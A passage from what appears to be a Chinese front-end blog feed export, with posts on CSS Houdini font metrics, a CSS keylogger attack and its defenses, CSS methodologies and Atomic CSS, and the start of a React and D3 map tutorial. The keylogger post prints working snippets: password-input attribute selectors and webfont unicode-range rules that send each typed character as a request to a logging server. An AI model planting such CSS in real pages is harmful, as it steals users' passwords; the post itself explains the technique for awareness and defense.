Font Metrics APIFont Metrics 也沒有出現在上方的 Houdini API on render pipeline 中，但它其實已經被寫入 Draft 規範 中了。老實說看不是很懂他的 spec 寫的內容，但我猜測這東西的用途應該跟這篇文章 Deep dive CSS: font metrics, line-height and vertical-align 其中提到一個問題有關，（裡面非常詳細的介紹了 font metrics、line-height 與 vertical-align 在網頁上如何互相影響，推薦大家有空的話耐心閱讀一番。）：
不同 font-family 在相同 font-size 下，所產生的 span 高度會不同。
source from http://iamvdo.me/en/blog/css-font-metrics-line-height-and-vertical-align
要想控制 Font metrics，也就是控制字所佔的寬高的話，目前可以先用 CSS Properties 來處理，根據已知字體的 font-metrics 動態算出我們要 apply 多少的 font-size：
p &#123;    /* 定義好我們已知字型的 Font metrics */    /* font metrics */    --font: Catamaran;    --fm-capitalHeight: 0.68;    --fm-descender: 0.54;    --fm-ascender: 1.1;    --fm-linegap: 0;    /* 定義想要的高度 */    --capital-height: 100;    /* 設定 font-family */    font-family: var(--font);    /* 利用 Font metrics 的資訊與想定義的高度來計算出 font-size */    --computedFontSize: (var(--capital-height) / var(--fm-capitalHeight));    font-size: calc(var(--computedFontSize) * 1px);&#125;

而想必 Font Metrics API 就是希望能 expose 出更方便的 API 來達成上述的事情。
結論
Web 開發基本上就是由 HTML、JS、CSS 三大要素構成，然而 JS 與 CSS 的發展差異卻極其龐大，一個速度快到讓人跟不上，一個則是等半天還是無法放心使用新規格，實在非常有趣…但透過這次了解 Houdini API 的過程，理解到了 CSS 算是朝向好的方向前進，雖然很多離實際採用還有段距離，但至少我們已經能夠在最新的瀏覽器上使用 Custom Properties 了！CSS 的未來還是充滿希望的！
資料來源
CSS Houdini- the bridge between CSS, JavaScript and the browser)
Houdini Draft
Deep dive CSS: font metrics, line-height and vertical-align
Houdini: Maybe The Most Exciting Development In CSS You’ve Never Heard Of
houdini-samples
Houdini API Draft

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>Houdini</tag>
        <tag>Custom-Properties</tag>
        <tag>Worklets</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS keylogger：攻擊與防禦</title>
    <url>/2018/03/02/css-key-logger/</url>
    <content><![CDATA[前言前陣子在 Hacker News 上面看到這篇：Show HN: A CSS Keylogger，大開眼界，決定要找個時間好好來研究一下，並且寫一篇文章分享給大家。
這篇會講到以下東西：

什麼是 keylogger
CSS keylogger 的原理
CSS keylogger 與 React
防禦方法

好，那就讓我們開始吧！
Keylogger 是什麼？Keylogger 就是鍵盤側錄，是惡意程式的一種，拿來記錄你電腦上面所有按過的按鍵。還記得我小時候曾經用 VB6 寫了一個超簡單的 keylogger，只要呼叫系統提供的 API 並且記錄相對應的按鍵就好。
在電腦上面被裝這個的話，就等於你輸入的任何東西都被記錄起來。當然，也包含了帳號跟密碼。不過如果我沒記錯，防毒軟體的行為偵測應該可以把這些都擋掉，所以也不用太過擔心。
剛剛講的是在電腦上面，現在我們把範圍縮小，侷限在網頁。
如果你要在頁面上加一個 keylogger，通常會利用 JavaScript 來達成，而且程式碼超級簡單：
document.addEventListener(&#x27;keydown&#x27;, e =&gt; &#123;  console.log(e.key)&#125;)

只要偵測keydown事件並且抓出按下的 key 就行了。
不過假如你有能力在你想入侵的網頁上面加入 JavaScript 的話，通常也不需要這麼麻煩去記錄每個按鍵，你直接把 Cookie 偷走、竄改頁面、導到釣魚頁面，或者是在 submit 的時候把帳號密碼回傳給自己的 Server 就好，所以 keylogger 顯得不是那麼有用。
好，那假設我們現在沒辦法插入惡意的 JavaScript，只能改 CSS，有辦法用純 CSS 做出一個 keylogger 嗎？
有，畢竟 CSS 能做的事情可多了。
純 CSS keylogger 的原理直接看程式碼你就懂了（取自：maxchehab&#x2F;CSS-Keylogging）：
input[type=&quot;password&quot;][value$=&quot;a&quot;] &#123;  background-image: url(&quot;http://localhost:3000/a&quot;);&#125;

神奇吧！
如果你不熟悉 CSS selector，這邊幫你複習一下。上面那段意思就是說如果 type 是 password 的 input，value 以 a 結尾的話，背景圖就載入http://localhost:3000/a 。
現在我們可以把這串 CSS 改一下，新增大小寫英文字母、數字甚至是特殊符號，接著會發生什麼事呢？
如果我輸入 abc123，瀏覽器就會發送 Request 到：

http://localhost:3000/a
http://localhost:3000/b
http://localhost:3000/c
http://localhost:3000/1
http://localhost:3000/2
http://localhost:3000/3

就這樣，你的密碼就完全被攻擊者給掌握了。
這就是 CSS keylogger 的原理，利用 CSS Selector 搭配載入不同的網址，就能夠把密碼的每一個字元發送到 Server 去。
看起來很可怕對吧，別怕，其實沒那麼容易。
CSS keylogger 的限制不能保證順序雖然你輸入的時候是按照順序輸入的，但 Request 抵達後端的時候並不能保證順序，所以有時候順序會亂掉。例如說 abc123 變成 bca213 之類的。
但如果我們把 CSS Selector 改一下的話，其實就能解決這個問題：
input[value^=&quot;a&quot;] &#123;  background-image: url(&quot;http://localhost:3000/a_&quot;);&#125;  input[value*=&quot;aa&quot;] &#123;  background-image: url(&quot;http://localhost:3000/aa&quot;);&#125;  input[value*=&quot;ab&quot;] &#123;  background-image: url(&quot;http://localhost:3000/ab&quot;);&#125;

如果開頭是 a，我們就送出a_，接著針對 26 個字母跟數字的排列組合每兩個字元送出一個 request，例如說：abc123，就會是：

a_
ab
bc
c1
12
23

就算順序亂掉，透過這種關係你把字母重新組合起來，還是可以得到正確的密碼順序。
重複字元不會送出 Request因為載入的網址一樣，所以重複的字元就不會再載入圖片，不會發送新的 Request。這個問題目前據我所知應該是解不掉。
在輸入的時候，其實 value 不會變這個其實是 CSS Keylogger 最大的問題。
當你在 input 輸入資訊的時候，其實 input 的 value 是不會變的，所以上面講的那些完全不管用。你可以自己試試看就知道了，input 的內容會變，但是你用 dev tool 看的話，會發現 value 完全不會變。
針對這個問題，有兩個解決方案，第一個是利用 Webfont：
&lt;!doctype html&gt;&lt;title&gt;css keylogger&lt;/title&gt;&lt;style&gt;@font-face &#123; font-family: x; src: url(./log?a), local(Impact); unicode-range: U+61; &#125;@font-face &#123; font-family: x; src: url(./log?b), local(Impact); unicode-range: U+62; &#125;@font-face &#123; font-family: x; src: url(./log?c), local(Impact); unicode-range: U+63; &#125;@font-face &#123; font-family: x; src: url(./log?d), local(Impact); unicode-range: U+64; &#125;input &#123; font-family: x, &#x27;Comic sans ms&#x27;; &#125;&lt;/style&gt;&lt;input value=&quot;a&quot;&gt;type `bcd` and watch network log
（程式碼取自：Keylogger using webfont with single character unicode-range）
value 不會跟著變又怎樣，字體總會用到了吧！只要每打一個字，就會送出相對應的 Request。
但這個方法的侷限有兩個：

沒辦法保證順序，一樣也沒辦法解決重複字元的問題
如果欄位是&lt;input type=&#39;password&#39; /&gt;，就沒有用

（在研究第二個侷限的時候發現一件有趣的事，由於 Chrome 跟 Firefox 會把「頁面上有 type 是 password 的 input，但是又沒用 HTTPS」的網站標示為不安全，所以有人研究出用普通 input 搭配特殊字體來躲過這個偵測，並且讓輸入框看起來像是 password（但其實 type 不是 password），在這種情形下就可以用 Webfont 來攻擊了）
再來我們看第二種解決方案，剛剛有說到這個問題的癥結點在於 value 不會變，換句話說，如果你 input 輸入值的時候，value 會跟著變的話，這個攻擊手法就很用了。
嗯…有沒有一種很熟悉的感覺。
class NameForm extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;value: &#x27;&#x27;&#125;;      this.handleChange = this.handleChange.bind(this);  &#125;    handleChange(event) &#123;    this.setState(&#123;value: event.target.value&#125;);  &#125;    render() &#123;    return (      &lt;form&gt;        &lt;label&gt;          Name:          &lt;input type=&quot;text&quot; value=&#123;this.state.value&#125; onChange=&#123;this.handleChange&#125; /&gt;        &lt;/label&gt;      &lt;/form&gt;    );  &#125;&#125;
（以上程式碼改寫自React 官網）
如果你用過 React 的話，應該會很熟悉這個模式。你在輸入任何東西的時候，會先改變 state，再把 state 的值對應到 input 的 value 去。因此你輸入什麼，value 就會是什麼。
React 是超夯的前端 Library，可以想像有一大堆網頁都是用 React 做的，而且只要是 React，幾乎就能保證 input 的 value 一定會同步更新（幾乎啦，但應該還是有少數沒有遵循這個規則）。
在這邊先做個總結，只要你 input 的 value 會對應到裡面的值（假如你用 React，幾乎一定會這樣寫），並且有地方可以讓別人塞入自訂的 CSS 的話，就能成功實作出 CSS Keylogger。雖然有些缺陷（沒辦法偵測重複字元），但概念上是可行的，只是精準度沒那麼高。
React 的回應React 的社群也有針對這一個問題進行討論，都在 Stop syncing value attribute for controlled inputs #11896 這個 Issue 裡。
事實上，讓 input 的 value 跟輸入的值同步這件事情一直都會有一些 bug，以前甚至發生了知名流量分析網站 Mixpanel 不小心記錄敏感資訊的事件，而最根本的原因就是因為 React 會一直同步更新 value。
Issue 的討論滿值得一看的，裡面有提到大家常搞混的一件事情：Input 的 attributes 跟 properties。我找到 Stackover flow 上面一篇不錯的解釋：What is the difference between properties and attributes in HTML?
attributes 基本上就是你 HTML 上面的那個東西，而 properties 代表的是實際的 value，兩個不一定會相等，舉例來說：
&lt;input id=&quot;the-input&quot; type=&quot;text&quot; value=&quot;Name:&quot;&gt;

假如你今天抓這個 input 的 attribute，你會得到Name:，但如果你今天抓 input 的 value，你會得到目前在輸入框裡面的值。所以其實這個 attribute 就跟我們常用的 defaultValue 是一樣的意思，就是預設值。
不過在 React 裡面，他會把 attribute 跟 value 同步，所以你 value 是什麼，attribute 就會是什麼。
從討論看起來，在 React 17 滿有機會把這個機制拿掉，讓這兩者不再同步。
防禦方法上面講了這麼多，因為現今 React 還沒把這個改掉，所以問題還是存在著。而且其實除了 React，也可能有別的 Library 做了差不多的事情。
Client 端的防禦方法我就不提了，基本就是裝一些別人寫好的 Chrome Extension，可以幫你偵測符合模式的 CSS 之類的，這邊比較值得提的是 Server 端的防禦。
目前看起來最一勞永逸的解決方案就是 Content-Security-Policy，簡而言之它是一個 HTTP Response 的 header，用來決定瀏覽器可以載入哪些資源，例如說禁止 inline 程式碼、只能載入同個 domain 下的資源之類的。
這個 Header 的初衷就是為了防止 XSS 以及攻擊者載入外部的惡意程式碼（例如說我們這個 CSS keylogger）。想知道更詳細的用法可以參考這篇：Content-Security-Policy - HTTP Headers 的資安議題 (2)
總結不得不說，這個手法真的很有趣！之前第一次看到的時候也驚嘆了好一陣子，居然能發現這樣子的純 CSS Keylogger。雖然技術上是可行的，但在實作上還是會碰到許多困難之處，而且要符合滿多前提才能做這樣子的攻擊，不過還是很值得關注後續的發展。
總之呢，這篇文就是想介紹這個東西給讀者們，希望大家有所收穫。
參考資料
Keylogger using webfont with single character unicode-range #24
Stop syncing value attribute for controlled inputs #11896
maxchehab&#x2F;CSS-Keylogging
Content-Security-Policy - HTTP Headers 的資安議題 (2)
Stealing Data With CSS: Attack and Defense
Bypassing Browser Security Warnings with Pseudo Password Fields
CSS Keylogger (and why you shouldn’t worry about it)
Mixpanel JS library has been harvesting passwords 

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>css</tag>
        <tag>key logger</tag>
      </tags>
  </entry>
  <entry>
    <title>淺談 CSS 方法論與 Atomic CSS</title>
    <url>/2017/04/29/css-methodology-atomiccss/</url>
    <content><![CDATA[See the Pen css-is-awesome by Arvin (@arvin0731) on CodePen.


今天來點輕鬆的，看標題就知道我想介紹一下 Atomic CSS，這是一套由 Yahoo 開源的 CSS 工具，工作上使用了蠻長一段時間，一開始使用起來其實覺得蠻不習慣的，但是久了以後發現搭配 React 寫起來雖然醜了點但是方便又易懂，非常適合獨立作業的前端工程師（設計師不參與 HTML, CSS 切版等動作），待我稍後慢慢說來。
在介紹 Atomic CSS 之前，我想順便複習一下現今的 CSS methodology，以及 React 出現後對 CSS 的影響，進而帶出 Atomic CSS 想解決的問題與其帶來的好處。後續的一些說明多參考自許多網路資源，附錄在文章最後面。
CSS 架構心法剛開始接觸前端時，對於 CSS 也不太會去思考什麼架構，覺得就自己 class name 命名清楚一點，檔案整理好一點就好，但是這幾乎僅適用於專案規模還算小的時候，一但開發的專案龐大起來，並且有多位前端工程師在進行程式碼撰寫時，就很容易遇到命名衝突、stylesheet 過於龐大等問題，主因是在 CSS 的世界中，所有規則集都是全域的。（註：規則集 (ruleset) - 由一個宣告區塊所涵括的一或多個選擇器所組成, ex: modal-text &#123; color: #000, font-size: 12px &#125;）
為了更加明確的管理 CSS，開始有人提出一些 CSS 的架構心法，想讓 CSS 也能有良好的重用性、維護性與延展性。
比較有名的 CSS 架構心法大致上分為這三種：

OOCSS
SMACSS
BEM

有份流傳已久的投影片在說明這三種心法：漫談 CSS 架構方法 - Kuro Hsu
這邊我就簡單節錄重點：
OOCSS
身為工程師，看到 OO 兩個字一定就會想到 Object-Oriented 吧，OOCSS 主意就在於將 CSS 物件化、模組化，其主要原則有兩個：
1. Separation of Structure from Skin: 
Structure 可以看作是 CSS 中定義元素的 box-modal 大小、margin 與 position 的部分，而 Skin 自然就是表現性的 Style，像是顏色、字型大小、border-color、box-shadow 等等，在 OOCSS 的原則中，這兩部分的 CSS 不能混合在同一個規則集中。
Example:
一般在定義一個 div 的長相時，直覺就會寫出下列這種 CSS，根據該 div selector 定義好其大小、位置與顏色
#modal &#123;    width: 500px;    height: 500px;    box-sizing: border-box;    padding: 20px;    border: solid 1px #1ED3A9;    background: linear-gradient(#09D083, #1ED3A9);    box-shadow: rgba(0, 0, 0, .5) 2px 2px 5px;    overflow: hidden;    position: fixed;    top: 50%;    left: 50%;    transform: translateX(-50%);&#125;#button &#123;    width: 100px;    height: 30px;    box-sizing: border-box;    padding: 20px;    border: solid 1px #1ED3A9;    background: linear-gradient(#09D083, #1ED3A9);    box-shadow: rgba(0, 0, 0, .5) 2px 2px 5px;&#125;

而 apply OOCSS 的第一原則後，可以修改成如下，將共用的表現型 Style 抽取出來，並且以 class 取代 id 作為 selector，讓其可以 reuse：
.modal &#123;    width: 500px;    height: 500px;    box-sizing: border-box;    padding: 20px;    position: fixed;    top: 50%;    left: 50%;    transform: translateX(-50%);&#125;.button &#123;    width: 100px;    height: 30px;    box-sizing: border-box;    padding: 20px;&#125;.defaultTheme &#123;    border: solid 1px #1ED3A9;    background: linear-gradient(#09D083, #1ED3A9);    box-shadow: rgba(0, 0, 0, .5) 2px 2px 5px;    overflow: hidden;&#125;

2. Separation of Containers and Content:
關於 OOCSS 的第二原則，白話來說就是要求你將 css 與 html 盡量切割，以可共用的 class selector 來定義 style 並放入該 html 元素中。
Example:
假設我們定義 Header id 底下的 h1 要是如下 style：
#header h1 &#123;    font-size: 2rem;    color: #1ED3A9&#125;

假若之後想要在不同地方的 h1 有不同顏色，但同時保有相同 size 呢？你得這樣複寫：
#header h1, #footer h1 &#123;    font-size: 2rem;    color: #1ED3A9&#125;#footer h1 &#123;    color: red;&#125;
這樣不僅是有重複的 style，更是難以維護，以 OOCSS 的角度來看，若將這些共用的 style 另外包成 class，最後在 apply 到需要的 html 上，會清楚許多。
&lt;div class=&quot;header commonFontSize&quot;&gt;&lt;/div&gt;&lt;div class=&quot;footer commonFontSize&quot;&gt;&lt;/div&gt;

.commonFontSize &#123;    font-size: 2rem;&#125;.header &#123;    color: #1ED3A9&#125;.footer &#123;    color: red;&#125;

OOCSS 的指標人物 Nicole Sullivan 有個 media object 的 reusable module 以 oocss 概念實作，大家可以參考。
總結一下 OOCSS 優點與實作方針：
優點：更小的 css size，能讓網站加速；更方便管理模組化的 css stylesheet。實作方針：避免 descendent selector 與 id selector，使用 class 並盡量與 html 元素綁定。Don’ do: #button h3, span.title
SMACSS
SMACSS 有線上的官方電子書 Scalable and Modular Architecture for CSS
看名稱就知道是以整體專案的 Architecture 來考量，與 OOCSS 我覺得是相同概念，只是關注點的起始位置不同，從不同瀏覽器對於基礎元件的 style 就開始考量，除了與 OOCSS 相似但有規範的 結構分類 與 CSS與HTML分離，還多了命名規則的限制。
結構分類：
Base
Layout
Module
State
Theme

Base:定義頁面中HTML Element的最基本Style，包含CSS Reset(一致化各瀏覽器自定義的 style)，因此只會用到 element tag selector。
Layout:所謂 Layout 就是將頁面切割定義成不同的區塊，像是 naviagtion、header、sidebar 等等，由於這些區塊大多獨立出現在頁面，因此用 ID 宣告是 ok 的，但若是有重複區塊類型，但不同 style，則可以採用 class 加上 cascade 來處理。
#sidebar &#123;    width: 30%;    float: right;&#125;.l-fixed #sidebar &#123;    width: 10%;&#125;

Module:Module 基本上與 Layout 相同，都是頁面上的區塊，只是偏向於 Content，但是嚴禁使用 id 或是 element selector，只准使用 class selector，可以透過命名的方式來管理這些 class，即 Subclassing 或 Sub module:
.modal-body &#123; width: 100% &#125; /* 用 dash 分隔 class (subclassing/submodule)*/.modal-header &#123; height: 50px; width: 100% &#125;

State:State 顧名思義就是根據元件的狀態給予不同的 style，因此命名上，針對該狀態的描述越精準越好：
&lt;div class=&quot;modal-button active&quot;&gt;&lt;/div&gt;
.active &#123; color: red; &#125;

Theme:這個很好懂，其實就是針對網站主視覺定義好各種 Module 或是 Layout 需要的 Style，像是 Bootstrap、Material-UI 中也有類似概念。
這邊稍為總結一下 SMACSS 的優缺，更多細節可以參考電子書：
優： 根據結構分類，並定義出 Base style，最小化各瀏覽器的差異，遵守其 Layout、Module、State 規則可以有良好的重用性與維護性，並分離 CSS 與 HTML，進而幫助簡化 selector 深度，增加效能、減少 Size。缺：與 OOCSS 一樣，可能會造成 Class 定義過多
BEM
最後一個心法是 BEM，核心觀念與現今流行的 React, Vuejs 相像，強調模組化與 css 的重複利用性，因此只使用 Class selector，以其特有的命名規則來規範。不像先前 OOCSS 或 SMACSS 的 class 可能會讓你命名出 MargintTop-10 這樣以 skin 為主的 class name，BEM 以功能導向來命名，將網頁組成分為 Block, Element, Modifier。
Block：就是一個獨立並可重複使用的頁面元件，如同 SMACSS 的 Layout&#x2F;Module，命名若有需要則以 dash (-) 串接.search-field &#123;...&#125;。
Element：是 Block 中不可分離的小元件，一定存在於 Block 下，但 Block 不一定會有 Element。因為一定存在於 Block 中，因此命名會一定有 Block Name 作為 prefix，以雙底線分隔 :
.search-field__button {…}

Modifier：用來定義 Block 或 Element 的狀態或屬性，像是 SMACSS 的 State，可以多個 modifier 同時存在於 Block 與 Element 中。命名則以 Block 或 Element name 作為 prefix，以單底線分隔
.search-field__button_hover {…}
另外，BEM 甚至提出了依照 BEM 的架構來區分 file structure：（截圖至官網）
結論與轉折CSS 心法除了上述三種以外，其實還有 SUIT CSS 等等，不過就大同小異，主要都是希望提高 CSS 的重用性、可維護性與延展性，發展至此似乎趨於穩定，搭配 SASS 等工具幾乎已經能很好的管理 CSS 了，但是從 React 出來以後，其推薦的 CSS in JS 根本打翻了上述的哲學，既然要用 JS 來寫 component，那 CSS 直接用 inline-style 的方式寫在 jsx 中，就不用記一堆有的沒的命名規則，又不用擔心全域變數影響，多棒啊！
但從來沒有完美的解法，有很多人討厭這樣的做法，所以出現了 Radim 或 CSS-module 這樣的東西，算是蠻完美的利用 Scoped css來做到擁有原始 css style 使用彈性的 CSS in JS。
不管是用哪種方式，朝向模組化、Scoped CSS 的方向看來都是不變的。
Atomic CSS
既然我們複習了 CSS 心法，也了解到目前因應 React 的發展而出現的 CSS-module 等方式，我們就可以來介紹一下由 Yahoo 這個曾經的網路巨人所開源的 Atomic CSS 吧！
這邊要特別說明一下，Atomic CSS 並不是來解決上述心法的缺點，要解決的問題都雷同，都是希望能讓 CSS 在大型專案下能擁有更好的重用性與維護性，只是採用的方法與面向不同罷了。
透過前述心法我們可以利用 class selector 的方式來處理命名衝突的麻煩，但是還有可能造成 stylesheet 過大，因為你可能會依據不同 component 來設置不同的 namespace，而且一個不小心，若 CSS 階層越多，效能就會越差。加上不同團隊一起開發時，可能還會有不同命名，卻有相同效果：
block1__text_highlight &#123;  color: yellow;&#125;...block2__text_bright &#123;  color: yellow;&#125;

因此 Atomic CSS 提出另一種觀點：
將 CSS style 最小元件化，重用性最大化只要確保同一個 style 永遠只會被定義一次，並且可以運用在各個地方，就能解決這些問題！
實際作法就看一下範例吧：
&lt;div class=&quot;D(f) W(100px)&quot;&gt;&lt;/div&gt;

利用 Atomic css 的工具，會幫你將上述 html 中的 class name 解析成：
.D\(f\) &#123;  display: flex;&#125;.W\(300px\) &#123;  width: 100px;&#125;

應該很淺顯易懂吧！D(f) 對應到 display:flex 這個 style，也就是說，Atomic 以一種 css style 作為 class name 的最小單位。
再稍微想一下你就會發現，這根本就是在寫 inline-style，只是我們用 class name 的方式來表示而已啊！
沒錯，但這樣做的好處就是可以 Define once, use everywhere.
今天你就算有另一個 div 也想要有 display:flex 的屬性，只要加上 D(f) 這個 class name 就可以了，同樣 style，不用重複定義 class name！
在大型專案內，你的元件越多、重複的屬性用得越多，相對於其他心法，你就可能省下更多 Size！
而且這樣的寫法，搭配 React 真的很方便，也符合原先 CSS in JS 的概念，透過串接多個 “Atomic Class” 的方式在元素上來達到原先 css style 的效果。
來看個實際的 Example：
import React from &#x27;react&#x27;;class Modal extends React.Component &#123;    render() &#123;        return (            &lt;div className=&quot;P(10px) M(20%) Pos(f) Start(50%) Bgc(#fff)&quot; /&gt;        );    &#125;&#125;;export default Modal;

Atomic css tool parsed 過的 css
.Bgc\(#fff\) &#123;  background-color: #ffffff;&#125;.M\(20\%\) &#123;  margin: 20%;&#125;.Pos\(f\) &#123;  position: fixed;&#125;.Start\(50%\) &#123;  left: 50%;&#125;.P\(10px\) &#123;  padding: 10px;&#125;

有發現嗎？從此以後你要看一個 component 的時候，可以直接從 jsx 檔案中看完整個元件的狀態與樣式，不用再切換 jsx 與 css 檔案了，而且透過這樣的 class name 命名，只要稍微熟悉以後，就超級好懂這個 div 用了哪些 style。（就算不懂，官網也有很方便的查閱工具）。
最後列舉一下優點：

將 class name 定義最小化，讓全站都能重複使用。
透過 Atomic CSS 的 parser（or webpack loader），只會產生你有使用到的 classname 的 stylesheet。
比起 inline style 的寫法更簡潔，又不會有命名衝突。
加上此種 class name 很好壓縮，整體 size 可以很小。
搭配 React，從此 component 的狀態與樣式合為一體。

我知道會有很多人覺得這樣違反直覺、寫起來很醜、沒有語意化等等，我一開始也閃過這種念頭，但是身為工程師，我們擅長打破常規、利用創意來解決問題。這些 class name 的確不語意化，但是身為工程師，我想我們擅長理解這些代號。寫程式都知道，語言只是工具，邏輯才是重點，如果可以避免，可以不必花這麼多時間在思考命名。
當然，以上只是我的觀點啦～推薦大家試用看看！
同場加映另一個類似概念，但處理機制不太相同的 Tachyons css
資料來源
Intro-to-OOCSS
漫談 CSS 架構方法 - Kuro Hsu
Scalable CSS - 介紹OOCSS&#x2F;SMACSS&#x2F;BEM
Scalable and Modular Architecture for CSS
BEM
Atomic css 介紹

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>css</tag>
        <tag>atomic css</tag>
        <tag>methodology</tag>
      </tags>
  </entry>
  <entry>
    <title>D3v4 工作坊 - React + D3 繪製 svg 動態路線地圖</title>
    <url>/2017/07/21/d3-workshop-map/</url>
    <content><![CDATA[前言以前在做一些跟地圖有關的應用時，第一個出現在腦海的不外乎是 Google Map 和 OpenStreetMap，然後搭配 Leaflet 與 Mapbox 等工具來對 map tile 做各種加工渲染，然而到了工作上需要時就會發現這些工具在不付費、遵守授權的狀況下，就出現了各種限制，像是需要自己架設 tile server 來轉換 OpenStreetMap 的圖資，或是 request 的次數限制等等。
想了想發現最好的替代方案就是直接用 svg 來繪製，雖然沒有辦法像 Google Map 那般詳細，但在某些應用上來說就非常足夠，效果也很好，因此今天就來紀錄一下該如何使用 D3.js 與 svg 來繪製出有動態路線功能的地圖，讓大家可以做出類似中央氣象局的颱風路線預覽圖的作品！
先看一下成品：(P.S. 最近發現 codesandbox 這個服務，比起在 jsbin 或是 jsfiddle 上寫 React 來說好用一些，缺點是 mobile 體驗較差)


地圖資料搜集要自己畫地圖，當然就必須自己準備好圖資，看你想要台灣地圖或是世界地圖，基本上在網路上都能找得到，但是在使用網路資料的時候都需要小心授權條款，以世界地圖為例，目前我看到最能自由運用的就是 Natural Earth 的資料了，基本上有分三種比例的圖資，1:10m、1:50m 與 1:100m:

從 Natural Earth 載下來的會是 Vector data，無法直接使用在 D3.js 上，好在 D3.js 的作者 Mike Bostock 製作的另一套工具 topojson 中已經有 parse 過後的 TopoJSON 檔案，可以直接透過 https://unpkg.com/world-atlas@1/world/110m.json 取得，50m 的也有，就換一下後面的檔名即可。
如果你想要其他 Natural Earth 上的資料，其實也可以修改 world-atlas 裡面的 script 來自己轉換成 TopoJSON，可以參考我 fork 過來修改的這份檔案 prepublish-populor-place.sh，用來 parse Natural Earth 上的 popular_place data。
繪製基本的 svg 地圖已經有了資料來源，就可以開始動手將地圖繪製出來了！
首先，React component 的起手式先準備好：
WorldMap.jsximport React, &#123; Component &#125; from &#x27;react&#x27;;import &#123; render &#125; from &#x27;react-dom&#x27;;class WorldMap extends Component &#123;  constructor() &#123;    super()    this.state = &#123;      worlddata: [],      typhoonPath: [],      marker: &#123;&#125;,      graticule: geoGraticule10(),    &#125;  &#125;    componentDidMount() &#123;     fetch(&quot;https://unpkg.com/world-atlas@1/world/50m.json&quot;)      .then(response =&gt; &#123;        if (response.status !== 200) &#123;          console.log(`There was a problem: $&#123;response.status&#125;`)          return;        &#125;        response.json().then(worlddata =&gt; &#123;          this.setState(&#123;            worlddata: feature(worlddata, worlddata.objects.countries).features,          &#125;);        &#125;)      &#125;);  &#125;  render() &#123;    return (      &lt;svg className=&quot;map-svg&quot; width=&#123; 800 &#125; height=&#123; 600 &#125; viewBox=&quot;0 0 800 600&quot;&gt;      &lt;/svg&gt;    )  &#125;&#125;render(&lt;WorldMap /&gt;, document.getElementById(&#x27;root&#x27;));

我在 componentDidMount 的時候去抓取地圖資料，接著才 setState()，但實際上你的專案可以先把資料存起來，這樣一來在 render 的地方就可以直接先 render 出 svg 地圖，這對於採用 Server-side rendering 的專案來說會方便很多，因為如果全部用 D3.js 的話，會需要先 select 到 DOM object 才能進行繪製，會麻煩一些。
利用 svg path 繪製世界地圖在 svg 底下 append 一個 group，然後 iterate state 中的世界地圖資料，加上每個區塊的 svg path：
world_map_path.js&lt;g className=&quot;countries&quot;&gt;    &#123;    this.state.worlddata.map((d,i) =&gt; (        &lt;path        key=&#123; `path-$&#123; i &#125;` &#125;        d=&#123; geoPath().projection(this.projection())(d) &#125;        className=&quot;country&quot;        fill=&#123; `rgba(219, 163, 43,$&#123; 1 / this.state.worlddata.length * i&#125;)` &#125;        stroke=&quot;#FFFFFF&quot;        strokeWidth=&#123; 0.5 &#125;        /&gt;    ))    &#125;&lt;/g&gt;
這邊先看一下我們 state 中的 worlddata 到底是什麼東西：

這是一個 TopoJSON 的格式，TopoJSON 簡單來說可以當作效能更好的 GeoJSON，詳細介紹可以看 這裡。Array 裡面的每一個 object 都是 type 為 Feature 的物件，其中的 geometry 包含了實際的地理資訊，可能是一個 Polygon，以及此 Polygon 每個點的座標。
接著我們需要使用 d3-geo 中的 geoPath，其中有 projection() method 能讓我們把剛剛的座標投影（project）到我們繪製的地圖上。
投影在地圖的繪製中扮演著極為重要的角色，透過投影，我們才能將真實世界的經緯度映射到我們網頁上小小的 svg 中。
d3-geo 中的 geoPath.projection() 會回傳一個 function，讓你傳地理資訊進去，接著回傳映射過後的 svg path，基本上就是一連串的 svg mini language，就是下列程式碼中的 d 的內容：
&lt;path d=&quot;M 10 25         L 10 75         L 60 75         L 10 25&quot;

M 代表將 筆 移動到 (10, 25)，接著 L 畫一條線到 (10, 75)，以此類推。詳細介紹可看 這裡。
當然，你必須傳入一個參數，告訴 geoPath.projection() 你想要映射的範圍為何，也就是 world_map_path.js 中 #L6 所傳入的 this.projection()：
projectionprojection() &#123;    return geoMercator()        .scale(1000)        .center([125.9605, 26.6978]);&#125;

也是回傳一個 Function，利用到 d3-geo 的 geoMercator，可以定義好你要映射的 scale 是多大，中心位置在哪。
最後為了讓每個國家的區塊有明顯區分，我們在 fill 的地方，隨機給他不同的顏色，fill=&#123; rgba(219, 163, 43,$&#123; 1 / this.state.worlddata.length * i&#125;) &#125;
到這個步驟你已經可以畫出下面這樣的地圖了：


繪製動態路線 - 資料準備接著進行重頭戲，我們要在地圖上繪製出動態的路徑圖。
第一個步驟也是先準備好資料，以文章開頭的成品來說，是我修改某年的颱風路徑資料而成的，如果想要串接目前的颱風路徑圖，可以到 氣象資料開放平臺 申請會員，就可以拿到 API Key 去索取資料，格式會是 xml。
API 範例：http://opendata.cwb.gov.tw/opendataapi?dataid=W-C0034-004&amp;authorizationkey=&#123;你的 API key&#125;其中 W-C0034-004 是颱風路徑圖資料的 data id。
資料中會有三個個主要部分，分別是過去的路徑資料 (past)、現在的位置 (curr) 與 未來預測的位置 (fcst)，簡單的 parser 可以參考我的 gist
出來的結果格式如下，主要包含經緯度座標與颱風半徑：
&#123;    &quot;pastData&quot;: [        &#123;            &quot;status&quot;: &quot;past&quot;,            &quot;time&quot;: &quot;2017-07-02T08:00:00+08:00&quot;,            &quot;coordinates&quot;: [                126.8,                20.9            ],            &quot;radius&quot;: 80        &#125;,        // ... 過往資料通常很多    ]    &quot;currData&quot;: [        &#123;            &quot;status&quot;: &quot;curr&quot;,            &quot;time&quot;: &quot;2017-07-05T02:00:00+08:00&quot;,            &quot;coordinates&quot;: [                142.5,                35.1            ],            &quot;radius&quot;: 120        &#125;    ],    &quot;fcstData&quot;: [        &#123;            &quot;status&quot;: &quot;fcst&quot;,            &quot;time&quot;: &quot;2017-07-05T14:00:00+08:00&quot;,            &quot;coordinates&quot;: [                150.5,                36.7            ],            &quot;radius&quot;: 120        &#125;    ]&#125;

繪製動態路線 - 路徑繪製資料產生後，記得先放到 state 當中：
